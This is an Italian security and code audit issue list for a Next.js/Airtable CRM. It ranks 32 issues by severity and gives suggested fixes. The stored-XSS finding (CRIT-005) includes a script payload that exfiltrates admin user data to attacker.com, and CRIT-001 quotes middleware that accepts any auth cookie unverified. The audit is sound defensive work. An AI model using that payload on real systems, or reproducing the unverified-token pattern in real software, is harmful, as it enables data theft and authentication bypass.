# ISSUE_LIST.md - Problemi Identificati & Rischi

**Data audit**: 2026-01-28  
**Branch**: audit-fix-20260128  
**Commit**: d50a109

---

## 📊 SOMMARIO PROBLEMI

| Severità | Conteggio | Note |
|----------|-----------|------|
| 🔴 **CRITICAL** | 5 | Richiedono fix immediato |
| 🟠 **HIGH** | 8 | Fix entro 1-2 settimane |
| 🟡 **MEDIUM** | 12 | Miglioramenti importanti |
| 🟢 **LOW** | 7 | Tech debt, pulizia |

**Totale**: 32 issue identificate

---

## 🔴 CRITICAL ISSUES (Priorità Massima)

### CRIT-001: JWT Verification Disabilitato in Middleware

**File**: `src/proxy.ts` (linee 55-75)

**Problema**:
```typescript
// Verifica validità del token (disabilitato temporaneamente per test)
// TODO: Fix JWT verification in Edge Runtime
console.log(`📝 [MIDDLEWARE] Token found, assuming valid for now`);

// Per ora assumiamo che il token sia valido se presente
const payload = { nome: 'Test User', email: 'test@example.com' };
```

La verifica JWT è completamente disabilitata. **Qualsiasi cookie chiamato `auth-token` viene accettato senza validazione**.

**Impatto**:
- 🚨 **SECURITY BREACH**: Chiunque può falsificare un cookie e accedere a routes protette
- Bypass completo del sistema di autenticazione
- Esposizione dati sensibili (leads, ordini, API keys)

**Rischio**: **CRITICO** - Exploit immediato possibile

**Fix richiesto**:
1. Implementare verifica JWT in Edge Runtime (compatibilità Next.js)
2. Usare `jose` library invece di `jsonwebtoken` per Edge compatibility
3. Validare signature con `JWT_SECRET`
4. Rifiutare token scaduti o malformati
5. Test: tentativo di accesso con token falso deve fallire

**Effort**: 2-4 ore

---

### CRIT-002: TypeScript Build Errors Ignorati in Produzione

**File**: `next.config.ts`

**Problema**:
```typescript
typescript: {
  ignoreBuildErrors: true,  // ❌ Pericoloso!
},
eslint: {
  ignoreDuringBuilds: true, // ❌ Pericoloso!
}
```

Gli errori TypeScript e ESLint vengono ignorati durante il build di produzione.

**Impatto**:
- 🐛 Bug nascosti che arrivano in produzione
- `undefined is not a function`, null pointer exceptions
- Type safety completamente vanificato
- Debugging difficile (errori a runtime invece che compile-time)

**Rischio**: **CRITICO** - Bug in produzione non rilevati

**Evidenza**: Commit recenti mostrano fix post-deploy per errori che avrebbero dovuto essere caught at build time.

**Fix richiesto**:
1. Rimuovere `ignoreBuildErrors: true`
2. Rimuovere `ignoreDuringBuilds: true`
3. Fix tutti gli errori TS/ESLint esistenti prima di riattivare
4. Aggiungere a CI/CD: `npm run type-check` deve passare

**Effort**: 1-2 giorni (dipende dal numero di errori esistenti)

---

### CRIT-003: Secrets Potenzialmente Committati in Git History

**Problema**:
Dalla timeline recente (commit e6019ff, fe890f8) si vede refactoring di gestione secrets. Alto rischio che secrets siano stati committati prima del refactoring.

**File potenzialmente interessati**:
- `.env` files (se mai committati)
- Script in `/scripts/` che leggono `process.env`
- Documentazione con esempi (`VERCEL_ENV_LIST.md`, `ENV_AUDIT_REPORT.md`)

**Impatto**:
- 🔑 API keys esposte pubblicamente (se repo è pubblico)
- Accesso Airtable, Google OAuth, OpenAI, GitHub
- Possibile furto dati o abuse

**Rischio**: **CRITICO** (se repo pubblico) / **HIGH** (se privato)

**Fix richiesto**:
1. **Immediato**: Scan git history per secrets:
   ```bash
   git log -p | grep -E 'AIRTABLE_API_KEY|JWT_SECRET|ENCRYPTION_MASTER_KEY'
   ```
2. Se trovati secrets:
   - **Rotazione immediata** di tutte le chiavi esposte
   - Rewrite git history (se possibile, con `git filter-branch` o BFG Repo Cleaner)
   - Notifica team e stakeholders
3. Aggiungere `detect-secrets` o `git-secrets` a pre-commit hooks
4. Audit Vercel deployment logs per esposizione accidentale

**Effort**: 4-8 ore + tempo rotazione chiavi

---

### CRIT-004: No Rate Limiting su API Routes

**Problema**:
Nessuna API route ha rate limiting implementato. Solo `AirtableClient` ha rate limiting interno (5 req/sec), ma:
- Non protegge da abuse dell'endpoint
- Non previene brute force su `/api/auth/login`
- Non protegge da DoS

**Impatto**:
- 🚨 **DoS Attack** possibile (flood di richieste)
- Brute force su login page
- Abuso risorse Airtable (quota exceeded)
- Costi inaspettati Vercel (function invocations)

**Rischio**: **CRITICAL** - Exploit facile, impatto immediato

**Evidenza**: Nessun middleware di rate limiting trovato nel codice.

**Fix richiesto**:
1. Implementare rate limiting con `@upstash/ratelimit`:
   ```typescript
   const ratelimit = new Ratelimit({
     redis: kv,
     limiter: Ratelimit.slidingWindow(10, "10s"),
   });
   ```
2. Applicare a tutte le API routes (middleware level)
3. Limiti differenziati:
   - Auth endpoints: 5 req/min per IP
   - Read endpoints: 30 req/min per user
   - Write endpoints: 10 req/min per user
4. Return `429 Too Many Requests` quando superato

**Effort**: 1 giorno

---

### CRIT-005: No Input Sanitization / XSS Vulnerability

**Problema**:
Input utente non sanitizzato su:
- Lead form (Nome, Email, Note, Esigenza)
- Activity notes
- Order descriptions

Rischio **Stored XSS** se dati vengono renderizzati senza escape.

**Impatto**:
- 🚨 **XSS Attack**: Injection di JavaScript malevolo
- Session hijacking (furto cookie auth-token)
- Defacement UI
- Phishing interno

**Rischio**: **CRITICAL** - Vettore di attacco comune

**Test**:
```javascript
// Input malevolo in Lead.Nome:
<script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('https://attacker.com',{method:'POST',body:JSON.stringify(d)}))</script>

// Se renderizzato senza escape → XSS
```

**Fix richiesto**:
1. Backend: Sanitize all input con `DOMPurify` o `validator.js`
2. Frontend: React già escape di default, ma verificare `dangerouslySetInnerHTML`
3. CSP headers già presenti (good!), ma verificare efficacia
4. Validation stricta con Zod su tutti i form inputs

**Effort**: 2-3 giorni

---

## 🟠 HIGH PRIORITY ISSUES

### HIGH-001: Duplicated Environment Management Files

**File**:
- `src/env.ts` (attivo)
- `src/lib/env.ts` (attivo)
- `src/lib/env.ts.disabled` (orphan)

**Problema**:
3 file che gestiscono environment variables, con logiche diverse. Confusione su quale sia source of truth.

**Impatto**:
- Difficoltà manutenzione
- Rischio di leggere env da file sbagliato
- Duplicazione logica fail-fast validation

**Fix**: Consolidare in singolo `src/env.ts`, rimuovere altri

**Effort**: 2 ore

---

### HIGH-002: Multiple Script Variants (No Version Control)

**File**:
- `scripts/create-orders.js`
- `scripts/create-orders-final.js`
- `scripts/create-orders-sequential.js`
- `scripts/create-orders-tables.js`

**Problema**:
4 script con nomi simili, nessuna documentazione su quale usare e quando.

**Impatto**:
- Risk di eseguire script sbagliato
- Data corruption se script vecchio viene usato
- Nessun migration tracking

**Fix**:
1. Identificare script "canonical" per ogni operazione
2. Archiviare vecchie versioni in `scripts/archive/`
3. Creare `scripts/RUNBOOK.md` con istruzioni uso
4. Implementare migration tracking (tabella Airtable o file JSON)

**Effort**: 4 ore

---

### HIGH-003: No Atomic Transactions per Orders Creation

**File**: `src/app/api/orders/route.ts`

**Problema**:
Creazione ordine richiede scritture multiple su tabelle diverse:
1. Orders table
2. Order Items table (N items)
3. Payment Transactions table
4. Commission Payments table

Se uno step fallisce a metà, rimangono **dati parziali inconsistenti**.

**Impatto**:
- 🐛 Ordini corrotti nel database
- Pagamenti o commission payments orfani
- Necessario cleanup manuale
- Dati finanziari inaccurati

**Rischio**: **HIGH** - Probabilità media, impatto alto

**Fix**:
1. Implementare pattern compensating transactions:
   - Se step N fallisce, rollback step 1..N-1
2. Salvare transaction log in tabella separata
3. Idempotency keys per prevenire duplicati su retry
4. Alert admin se transaction fallisce

**Effort**: 1-2 giorni

---

### HIGH-004: KV Single Point of Failure

**Problema**:
Tutto dipende da single Upstash KV instance:
- API keys storage
- Cache layer
- Session data (potenzialmente)

Se KV down → **tutto il sistema** è inaccessibile.

**Impatto**:
- 🚨 **Downtime totale** se Upstash ha problemi
- Nessun fallback
- Leads non caricano (cache miss + no keys to fetch from Airtable)

**Rischio**: **HIGH** - Dipende da affidabilità Upstash (generalmente alta, ma singolo punto)

**Mitigazione**:
1. **Immediate**: Fallback a `process.env` se KV fetch fails:
   ```typescript
   const key = await getAirtableKey().catch(() => process.env.AIRTABLE_API_KEY);
   ```
2. **Long-term**: Considera Redis cluster o multi-region KV
3. Health check endpoint che monitora KV status
4. Alert se KV latency > 500ms

**Effort**: 1 giorno

---

### HIGH-005: Cache Invalidation Race Conditions

**File**: `src/app/api/leads/route.ts` (POST handler)

**Problema**:
```typescript
// Create lead in Airtable
const createdRecord = await response.json();

// Async cache invalidation (NON-BLOCKING)
Promise.all([
  invalidateLeadCache(),
  invalidateUsersCache(),
]).catch(error => console.warn('Cache invalidation failed'));

// Return response immediately
return NextResponse.json({success: true, lead: createdRecord});
```

Cache invalidation è async e non-blocking. **User potrebbe vedere dati stale**.

**Scenario**:
1. User crea lead A
2. Response ritorna success
3. User ricarica lista leads → Cache HIT con dati vecchi (senza lead A)
4. Cache invalidation completa dopo 100ms
5. User confuso: "Ho creato il lead ma non lo vedo!"

**Impatto**:
- 🐛 UX confusa, sembra che operazione sia fallita
- Support requests per "missing data"
- Loss of confidence nel sistema

**Fix**:
1. **Opzione 1**: Await cache invalidation (adds ~100ms latency)
2. **Opzione 2**: Optimistic UI update (add lead to local state)
3. **Opzione 3**: Force refresh con `?_forceRefresh=true` dopo create

**Effort**: 4 ore

---

### HIGH-006: No Error Monitoring / Observability

**Problema**:
Zero error monitoring integrato. Errori vengono solo logged in `console.error()`.

**Impatto**:
- ❌ **Bugs in produzione invisibili** finché user non report
- No alerting su error spike
- No performance monitoring
- Difficult debugging senza stack traces complete

**Fix richiesto**:
1. **Integrate Sentry** (free tier):
   ```bash
   npm install @sentry/nextjs
   ```
2. Configure in `sentry.client.config.ts` e `sentry.server.config.ts`
3. Wrap API routes con Sentry error boundary
4. Source maps upload per stack traces
5. Setup alert rules (email/Slack)

**Effort**: 1 giorno

---

### HIGH-007: No Database Backups Strategy

**Problema**:
Airtable è unica fonte di persistenza dati. Nessun backup automatico documentato.

**Impatto**:
- 🚨 **Data loss catastrophic** se:
  - Bug cancella records in massa
  - Accidental table deletion
  - Airtable account compromesso

**Rischio**: **HIGH** - Bassa probabilità, altissimo impatto

**Fix richiesto**:
1. **Implement daily backups**:
   - Script che esporta tutte le tabelle in JSON
   - Upload a S3 / Vercel Blob con retention 30 giorni
   - Cron job daily (Vercel Cron o GitHub Actions)
2. Test restore procedure (almeno 1 volta)
3. Document recovery runbook

**Effort**: 1 giorno setup + 2 ore testing

**Script esempio**:
```javascript
// scripts/backup-airtable-daily.js
const tables = ['Leads', 'Activities', 'Orders', 'Users'];
for (const table of tables) {
  const records = await fetchAllRecords(table);
  await uploadToBlob(`backup-${table}-${date}.json`, records);
}
```

---

### HIGH-008: Middleware Non Verifica JWT ma Log Dice "Auth Valid"

**File**: `src/proxy.ts`

**Problema**:
```typescript
console.log(`✅ [MIDDLEWARE] Auth valid for user: ${payload.nome}`);
```

Log dice "auth valid" ma in realtà **nessuna verifica** è stata fatta. **Falso senso di sicurezza** nei log di monitoring.

**Impatto**:
- 🐛 Debugging difficile (log misleading)
- Security audit fallisce (log dicono sistema è secure ma non lo è)
- False positive in monitoring

**Fix**: Rimuovere o cambiare log in `Auth NOT VERIFIED (TODO)` fino a fix di CRIT-001

**Effort**: 10 minuti

---

## 🟡 MEDIUM PRIORITY ISSUES

### MED-001: Airtable Client Non Usato Consistentemente

**Problema**:
Molte API routes fanno fetch dirette ad Airtable invece di usare `AirtableClient`:

```typescript
// ❌ Direct fetch (bypasses rate limiting, retry logic)
const response = await fetch(`https://api.airtable.com/v0/${baseId}/${table}`, {
  headers: { Authorization: `Bearer ${apiKey}` }
});

// ✅ Should use
const client = await createAirtableClientFromKV();
const records = await client.list(table);
```

**Impatto**:
- Rate limiting inconsistente
- No retry logic su network errors
- Code duplication

**Fix**: Refactor tutte le chiamate dirette per usare client

**Effort**: 2-3 giorni

---

### MED-002: Caching Non Applicato a Tutte le Read Operations

**Routes senza caching**:
- `/api/orders` (GET)
- `/api/products` (GET)
- `/api/marketing/sources` (GET)
- `/api/activities` (GET) - parziale

**Impatto**:
- Performance subottimali (2-5s latency)
- Spreco quota Airtable API
- UX lenta

**Fix**: Applicare caching pattern a tutti gli endpoints read-heavy

**Effort**: 1 giorno

---

### MED-003: No Pagination UI per Orders e Products

**Problema**:
Orders e Products list fetch TUTTI i record in una chiamata. Con crescita dati:
- Orders: attualmente ~50, ma potrebbe crescere a 1000+
- Products: ~30, potrebbe crescere a 500+

**Impatto**:
- Performance degrada con crescita dati
- Initial load sempre più lento (>10s con 1000+ orders)

**Fix**: Implementare pagination UI come in `/leads`

**Effort**: 2 giorni

---

### MED-004: Missing TypeScript Types per Molti Airtable Records

**Problema**:
Molti record Airtable sono typed come `Record<string, unknown>` o `any`.

**Impatto**:
- IntelliSense non funziona
- Runtime errors per field mancanti
- Refactoring difficile

**Fix**: Generare types da Airtable schema (script automatico)

**Effort**: 1 giorno

---

### MED-005: No Test Coverage

**File**: `vitest.config.ts` esiste ma nessun test implementato.

**Impatto**:
- Regression risks su ogni deploy
- Refactoring pericoloso senza safety net

**Fix**: Implementare almeno critical path tests:
- Auth flow
- Lead CRUD
- Order creation

**Effort**: 3-5 giorni

---

### MED-006: Google Calendar Sync Non Error-Resilient

**Problema**:
Se Google Calendar API fallisce durante `/api/activities` POST:
- Activity viene creata in Airtable
- Ma Google Calendar event NO
- Nessun retry mechanism

**Impatto**:
- Sincronizzazione inconsistente
- User pensa evento sia in calendar ma non c'è

**Fix**: Implement retry queue con exponential backoff

**Effort**: 1 giorno

---

### MED-007: Lead Deduplication O(n²) Algorithm

**File**: `src/lib/lead-deduplication.ts`

**Problema**:
```typescript
// For each lead, compare with ALL other leads
for (let i = 0; i < leads.length; i++) {
  for (let j = i + 1; j < leads.length; j++) {
    if (areSimilar(leads[i], leads[j])) {
      // ...
    }
  }
}
```

Con 1000 leads = 500,000 comparisons (~15-20s).

**Impatto**:
- Slow operation (user waits)
- Timeout risk su Vercel (30s function timeout)

**Fix**: Implement indexing/hashing strategy per faster lookup

**Effort**: 1 giorno

---

### MED-008: No CORS Configuration per API Routes

**Problema**:
Se frontend deve chiamare API da dominio diverso (es. mobile app, external integration), CORS non è configurato.

**Impatto**:
- Future integrations bloccate
- Mobile app non può chiamare API

**Fix**: Add CORS middleware con whitelist domains

**Effort**: 2 ore

---

### MED-009: Hardcoded User/Tenant IDs in API Keys Service

**File**: `src/lib/api-keys-service.ts`

```typescript
this.userId = process.env.CURRENT_USER_ID || 'user_admin_001';
this.tenantId = process.env.CURRENT_TENANT_ID || 'tenant_doctorbed';
```

**Problema**: Multi-tenancy non supportato correttamente. Hardcoded defaults.

**Fix**: Extract from authenticated user context

**Effort**: 4 ore

---

### MED-010: No API Versioning

**Problema**:
Tutti gli endpoints sono `/api/*` senza versioning. Breaking changes impattano tutti i client immediatamente.

**Fix**: Implement `/api/v1/*` pattern

**Effort**: 1 giorno (refactor routes)

---

### MED-011: Marketing Expenses Non Linkati a Sources

**Problema**:
Marketing Expenses table registra costi ma non è linkato automaticamente a Marketing Sources. ROI calculation manuale.

**Fix**: Add link field e automated cost aggregation

**Effort**: 4 ore

---

### MED-012: No Email Notifications per Eventi Critici

**Problema**:
Nessuna notifica email per:
- Nuovo lead assegnato
- Order creato
- Payment ricevuto

**Impatto**: User devono controllare manualmente il CRM

**Fix**: Implement email service con Resend (già nelle deps)

**Effort**: 2 giorni

---

## 🟢 LOW PRIORITY ISSUES (Tech Debt)

### LOW-001: Unused Dependencies in package.json

Dependencies installate ma non usate:
- `@octokit/rest` - GitHub integration parzialmente usata
- `node-fetch` - Next.js ha fetch built-in
- `nanoid` - usato in 1-2 places, potrebbe usare crypto.randomUUID()

**Fix**: Audit e remove unused deps

**Effort**: 2 ore

---

### LOW-002: Inconsistent Code Style

Mix di:
- Single quotes / double quotes
- `async/await` vs `.then()`
- Arrow functions vs function declarations

**Fix**: Enforce con Prettier (già configurato ma non sempre usato)

**Effort**: Run `npm run format` + commit

---

### LOW-003: Large Bundle Size (Check Performance)

**Problema**: No analisi bundle size. React 19 + tutte le dependencies potrebbero generare large bundles.

**Fix**: Add `@next/bundle-analyzer` e ottimizzare

**Effort**: 1 giorno

---

### LOW-004: Components Duplicati (components.json vs components 2.json)

**File**:
- `components.json`
- `components 2.json`

**Fix**: Verificare differenze e consolidare

**Effort**: 1 ora

---

### LOW-005: Documentation Drift

Alcuni docs (`docs/source/*.md`) referenziano pattern vecchi o codice che non esiste più.

**Fix**: Audit documentazione e update/archive

**Effort**: 4 ore

---

### LOW-006: No Git Hooks (Linting, Type-check)

**Problema**: Nessun pre-commit hook per enforce quality standards.

**Fix**: Install Husky + lint-staged:
```bash
npm install -D husky lint-staged
npx husky install
```

**Effort**: 1 ora

---

### LOW-007: Vercel JSON Config Minimale

**File**: `vercel.json`

Potrebbe essere ottimizzato con:
- Custom headers per static assets
- Build environment variables
- Function regions configuration

**Fix**: Optimize config

**Effort**: 2 ore

---

## 📋 ISSUE PRIORITIZATION MATRIX

```
Impact    ↑
High      │ CRIT-001, CRIT-002, CRIT-003 │ CRIT-004, CRIT-005
          │ HIGH-001, HIGH-003, HIGH-007 │ HIGH-002, HIGH-006
          │                              │
Medium    │ MED-002, MED-003, MED-004   │ MED-001, MED-005, MED-006
          │ MED-007, MED-009            │
          │                              │
Low       │ LOW-003, LOW-005            │ LOW-001, LOW-002, LOW-004
          │ LOW-006, LOW-007            │
          └──────────────────────────────┴─────────────────────────>
               Low                            High           Likelihood
```

---

## 🎯 RECOMMENDED FIX ORDER

**Week 1 (Sprint 1):**
1. CRIT-001: JWT verification (2-4h)
2. CRIT-004: Rate limiting (1d)
3. CRIT-005: Input sanitization (2-3d)
4. HIGH-006: Error monitoring setup (1d)

**Week 2 (Sprint 2):**
5. CRIT-002: Remove TypeScript ignore + fix errors (1-2d)
6. CRIT-003: Secret scan + rotation (4-8h)
7. HIGH-001: Consolidate env files (2h)
8. HIGH-004: KV fallback implementation (1d)
9. HIGH-007: Backup strategy (1d)

**Week 3-4 (Sprint 3-4):**
10. HIGH-003: Order transaction safety (1-2d)
11. HIGH-005: Cache invalidation fix (4h)
12. MED-001: Standardize Airtable client usage (2-3d)
13. MED-002: Apply caching to all reads (1d)
14. MED-005: Critical path tests (3-5d)

**Month 2+:**
- Medium and Low priority issues based on team capacity
- Tech debt cleanup
- Documentation updates

---

**FINE ISSUE LIST**
